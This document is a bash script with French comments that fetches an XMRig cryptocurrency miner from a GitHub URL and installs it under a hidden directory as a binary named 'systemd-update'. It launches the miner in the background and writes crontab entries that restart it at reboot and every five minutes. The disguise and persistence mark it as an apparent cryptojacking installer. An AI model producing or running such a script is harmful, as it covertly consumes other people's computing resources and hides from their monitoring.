#!/bin/bash

DIR="$HOME/.sysd"
BIN="systemd-update"
GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"
LOGFILE="$HOME/setup_debug.log"

mkdir -p "$DIR" && cd "$DIR" || exit 1

# Log complet du setup
exec > >(tee "$LOGFILE") 2>&1

curl -fsSL "$GITHUB/xmrig.tar.gz" -o miner.tar.gz
tar -xzf miner.tar.gz
chmod +x "$BIN"

touch xmrig.log
chmod 666 xmrig.log
sleep 2

nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$DIR/xmrig.log" 2>&1 &

(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -

sleep 5

if [ -f "$DIR/xmrig.log" ]; then
  echo -e "\n[🧠] Dernières lignes du log XMRig :"
  tail -n 10 "$DIR/xmrig.log"
else
  echo "[!] Aucun fichier de log détecté. Le mineur a peut-être échoué."
fi
